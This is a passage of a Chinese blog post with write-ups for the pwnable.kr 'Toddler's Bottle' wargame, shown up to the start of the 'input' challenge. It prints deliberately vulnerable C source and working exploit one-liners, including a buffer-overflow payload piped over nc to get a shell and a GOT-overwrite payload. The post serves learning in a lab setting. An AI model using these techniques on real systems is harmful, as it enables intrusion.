<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="pwnable.kr 是一个非商业性的 Wargame 网站，提供了大量的 Pwn 类型的挑战，可以在该网站上练习和学习 Pwn 技术。 （PS：文章内容会随着做题进度进行更新） [fd] Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest)  通过 ssh 连接到答题环境后，可以在当前目录看到">
<meta name="keywords" content="security,writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="Toddler&#39;s Bottle Writeup [pwnable.kr]">
<meta property="og:url" content="http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/index.html">
<meta property="og:site_name" content="rickgray.me">
<meta property="og:description" content="pwnable.kr 是一个非商业性的 Wargame 网站，提供了大量的 Pwn 类型的挑战，可以在该网站上练习和学习 Pwn 技术。 （PS：文章内容会随着做题进度进行更新） [fd] Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest)  通过 ssh 连接到答题环境后，可以在当前目录看到">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-1.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-2.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-3.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-4.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-5.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-6.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-7.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-8.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-1.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-2.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-1.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-2.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/input-1.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/shellshock-1.png">
<meta property="og:updated_time" content="2018-04-24T15:48:57.517Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Toddler&#39;s Bottle Writeup [pwnable.kr]">
<meta name="twitter:description" content="pwnable.kr 是一个非商业性的 Wargame 网站，提供了大量的 Pwn 类型的挑战，可以在该网站上练习和学习 Pwn 技术。 （PS：文章内容会随着做题进度进行更新） [fd] Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest)  通过 ssh 连接到答题环境后，可以在当前目录看到">
<meta name="twitter:image" content="http://rickgray.me/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
          
        
    
    <!-- title -->
    <title>Toddler&#39;s Bottle Writeup [pwnable.kr]</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2015/07/25/rookiss-writeup-pwnable-kr/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2015/06/08/xml-entity-attack-review/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&text=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&is_video=false&description=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Toddler&#39;s Bottle Writeup [pwnable.kr]&body=Check out this article: http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&name=Toddler&#39;s Bottle Writeup [pwnable.kr]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#fd"><span class="toc-number">1.</span> <span class="toc-text">[fd]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#collision"><span class="toc-number">2.</span> <span class="toc-text">[collision]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bof"><span class="toc-number">3.</span> <span class="toc-text">[bof]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">4.</span> <span class="toc-text">[flag]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passcode"><span class="toc-number">5.</span> <span class="toc-text">[passcode]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-number">6.</span> <span class="toc-text">[random]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input"><span class="toc-number">7.</span> <span class="toc-text">[input]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mistake"><span class="toc-number">8.</span> <span class="toc-text">[mistake]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellshock"><span class="toc-number">9.</span> <span class="toc-text">[shellshock]</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Toddler&#39;s Bottle Writeup [pwnable.kr]
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">rickgray.me</span>
      </span>
      
    <div class="postdate">
        <time datetime="2015-07-23T16:00:00.000Z" itemprop="datePublished">2015-07-24</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/writeup/">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a> 是一个非商业性的 Wargame 网站，提供了大量的 Pwn 类型的挑战，可以在该网站上练习和学习 Pwn 技术。</p>
<p>（PS：文章内容会随着做题进度进行更新）</p>
<h3 id="fd"><a href="#fd" class="headerlink" title="[fd]"></a>[fd]</h3><blockquote>
<p>Mommy! what is a file descriptor in Linux?</p>
<p>ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>通过 ssh 连接到答题环境后，可以在当前目录看到三个文件 fd、fd.c、flag。</p>
<p>fd 是一个可执行文件，用于读取 flag 文件，其源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序通过 <code>argv[1]</code> 获取一字符串并使用 <code>atoi()</code> 函数将其转化为整型于 <code>0x1234</code> 作差，其结果赋值给整型变量 <code>fd</code>。</p>
<p>随后程序从 <code>fd</code> 文件描述符中读取32字节到 <code>buf</code> 中，并与字符串 <code>LETMEWIN\n</code> 进行比较，若相等则打印 flag 文件的内容，否则失败。</p>
<p>在 Linux 系统下，使用 <code>open()</code> 函数成功打开文件后会返回针对该文件的文件描述符（整型）,若打开失败会返回 <code>-1</code>。文件描述符 <code>0</code>，<code>1</code>，<code>2</code>分别对应系统的标准输入，标准输出，和标准错误输出。</p>
<p>此题可利用标准输入来将字符串 <code>LETMEWIN\n</code> 写到标准输入中，然后使得 <code>fd</code> 变量值为 <code>0</code> 即可从标注输入中读入。</p>
<pre><code>fd@ubuntu:~$ echo &quot;LETMEWIN&quot; | ./fd 4660
good job :)
mommy! I think I know what a file descriptor is!!
</code></pre><p>或者：</p>
<pre><code>fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
</code></pre><h3 id="collision"><a href="#collision" class="headerlink" title="[collision]"></a>[collision]</h3><blockquote>
<p>Daddy told me about cool MD5 hash collision today.</p>
<p>I wanna do something like that too!</p>
<p>ssh <a href="mailto:col@pwnable.kr" target="_blank" rel="noopener">col@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>登录后，查看当前目录下的 <code>col.c</code> 源文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序从 <code>argv[1]</code> 中得到一长度为20字节的字符串，并将其拆成5组数据，将5组数据的整型值相加与目标值 <code>0x21DD09EC</code> 进行比较，相等则打印 flag，不等则失败。</p>
<p>此题直接将 <code>0x21DD09EC</code> 拆成5个数字的和即可，通过 <code>argv[1]</code> 输入时，需要注意使用小端序。</p>
<pre><code>./col `python -c &quot;print &apos;\xc8\xce\xc5\x06&apos; * 4 + &apos;\xcc\xce\xc5\x06&apos;&quot;`
daddy! I just managed to create a hash collision :)
</code></pre><h3 id="bof"><a href="#bof" class="headerlink" title="[bof]"></a>[bof]</h3><blockquote>
<p>Nana told me that buffer overflow is one of the most common software vulnerability. </p>
<p>Is that true?</p>
<p>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a></p>
<p>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a></p>
<p>Running at : nc pwnable.kr 9000</p>
</blockquote>
<p>将 <code>bof</code> 文件下载下来，用 <code>file</code> 命令查看一下，可以看到是一个32位的 ELF 可执行文件，拖到 Ubuntu 中进行调试。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-1.png" alt="img"></p>
<p>简单运行发现程序需要我们输入一些字符串，根据提示可以知道此题需要进行溢出。直接抄起 <code>gdb</code> 调试之。尝试直接使用 <code>b main</code> 在主函数处设置断点。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-2.png" alt="img"></p>
<p><code>r</code> 开始运行，程序断在了主函数入口处，使用 <code>n</code> 进行单步跟踪，当走到 <code>0x8000069a</code> 处时，程序 <code>call 0x8000062c &lt;func&gt;</code> 调用了 <code>0x8000062c</code> 处的函数，直接 <code>s</code> 单步进入继续跟。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-3.png" alt="img"></p>
<p>当走到 <code>0x8000064c</code> 程序将寄存器 eax 的值 <code>0xbffff55c</code> 压入栈，随后进行 <code>call   0xb7e78cd0 &lt;_IO_gets&gt;</code>，此处为 c 语言中的 gets() 函数调用，最终 <code>0xbffff55c</code> 会指向用户输入的字符串。这里使用peda中的 <code>pattern create 64</code> 创建一个64字节的测试 payload 将其输入到程序中，方便后续调试。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-4.png" alt="img"></p>
<p>输入完字符串后，程序停在了 <code>0x80000654</code> 进行了一个简单的比较操作 <code>cmp DWORD PTR [ebp+0x8],0xcafebabe</code>，比较 <code>DWORD PTR [ebp+0x8]</code> 处的值是否等于 <code>0xcafebabe</code>，而此时的 <code>DWORD PTR [ebp+0x8]</code> 地址为 <code>0xbffff590</code>，回顾一下刚刚指向用户输入字符串的地址 <code>0xbffff55c</code>。输入的字符串地址处在一个低地址上，如果输入足够长的字符串，就能够覆盖到后面 <code>0xbffff590</code> 处的值。</p>
<p>当比较成功时，程序不会发生跳转，调用 <code>call 0xb7e54190 &lt;__libc_system&gt;</code>，而其参数为 <code>/bin/sh</code>，如下图。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-5.png" alt="img"></p>
<p>理清过程后，剩下的就只需要找到输入字符串指针距离 <code>0xbffff590</code> 的偏移即可。由于之前使用了特殊的 payload，这时候我们查看一下输入字符串周围的堆栈情况。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-6.png" alt="img"></p>
<p>可以看到刚才输入的 payload 已经覆盖到了 <code>0xbffff590</code> 处的值，但是并不是程序需要的 <code>0xcafebabe</code>，使用 <code>pattern offset</code> 来计算偏移。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-7.png" alt="img"></p>
<p>可以看到，<code>0xbffff590</code> 距离字符串开头的偏移为52个字节，因此为了成功地使程序跳转执行system(“/bin/sh”)，我们构造的输入字符串就应该为：</p>
<pre><code>&quot;A&quot; * 52 + &quot;\xbe\xba\xfe\xca&quot;
</code></pre><p>此时，直接使用命令行远程打 payload：</p>
<pre><code>(python -c &apos;print &quot;A&quot; * 52 + &quot;\xbe\xba\xfe\xca&quot;&apos;; cat -) | nc pwnable.kr 9000
</code></pre><p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-8.png" alt="img"></p>
<p>（当然，题目提供了 c 源码，也可以直接阅读源码进行分析）</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="[flag]"></a>[flag]</h3><blockquote>
<p>Papa brought me a packed present! let’s open it.</p>
<p>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a></p>
<p>This is reversing task. all you need is binary</p>
</blockquote>
<p>使用 <code>file</code> 命令查看下载回来的 <code>flag</code> 文件，发现是一个64位的 ELF 可执行程序。通过查看，发现其具有明显的 UPX 压缩标志，所以解压之。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-1.png" alt=""></p>
<p>通过 UPX 成功解压缩后得到 <code>flag-upx</code>，拖入 IDA 进行静态分析，发现在 <code>0x0000000000401184</code> 处引用了一个 <code>flag</code> 变量，通过 IDA 的交叉引用功能找到了该字符串，此值即为 flag。</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-2.png" alt=""></p>
<pre><code>UPX...? sounds like a delivery service :)
</code></pre><h3 id="passcode"><a href="#passcode" class="headerlink" title="[passcode]"></a>[passcode]</h3><blockquote>
<p>Mommy told me to make a passcode based login system.</p>
<p>My initial C code was compiled without any error!</p>
<p>Well, there was some compiler warning, but who cares about that?</p>
<p>ssh <a href="mailto:passcode@pwnable.kr" target="_blank" rel="noopener">passcode@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对 C 语言熟悉的同学都能很轻易的发现，程序在调用 <code>scanf()</code> 函数来获取用户输入时，第二个参数没有传递参数地址而直接传递了参数，可能导致内存异常写入。</p>
<p>通过 <code>gdb</code> 调试可以发现，输入的用户名 <code>name</code> 位于 <code>ebp-0x70</code>，<code>password1</code> 位于 <code>ebp-0x10</code>，<code>password2</code> 位于 <code>ebp-0xc</code>，由于这样的堆栈布局，导致了在输入用户名时可以覆盖到 <code>ebp-0x10</code>，也就是能控制 <code>password1</code> 的值，最终导致任意4字节写。</p>
<p>这里由于堆栈不能执行，不能更改 GOT 指向 shellcode，但是可以直接修改 GOT 后将程序流程跳转到输出 flag 的部分，即 <code>system(&quot;/bin/cat flag&quot;);</code>，我们查看一下代码所处位置：</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-1.png" alt=""></p>
<p>可以看到代码处于 <code>0x080485e3</code>，我们通过更改 <code>printf()</code> 函数的 GOT 来让我们输入完 <code>password1</code> 后的 <code>printf()</code> 函数调用流程转到 <code>system(&quot;/bin/cat flag&quot;);</code> 处。</p>
<p><code>name</code> 与 <code>password1</code> 相差 <code>96 bytes</code>，所有构造的 payload 如下：</p>
<pre><code>python -c &quot;print &apos;A&apos; * 96 + &apos;\x00\xa0\x04\x08&apos; + &apos;134514147\n&apos;&quot; | ./passcode
</code></pre><p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/passcode-2.png" alt=""></p>
<h3 id="random"><a href="#random" class="headerlink" title="[random]"></a>[random]</h3><blockquote>
<p>Daddy, teach me how to use random value in programming!</p>
<p>ssh <a href="mailto:random@pwnable.kr" target="_blank" rel="noopener">random@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();    <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此题考察 c 语言中随机数生成的问题，<code>rand()</code> 若没有提供参数会在当前环境使用同一随机种子来生成随机数，而通过在 <code>/tmp</code> 目录下进行测试，服务器上 <code>rand()</code> 生成的默认随机数值为 <code>1804289383</code>，需要输入的 <code>key</code> 值就应为：<code>1804289383 ^ 0xdeadbeef = 3039230856</code>。</p>
<pre><code>random@ubuntu:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...
</code></pre><h3 id="input"><a href="#input" class="headerlink" title="[input]"></a>[input]</h3><blockquote>
<p>Mom? how can I pass my input to a computer program?</p>
<p>ssh <a href="mailto:input@pwnable.kr" target="_blank" rel="noopener">input@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>此题提供了一段较长的代码，考察 linux 下基础编程知识，其完整代码如下。</p>
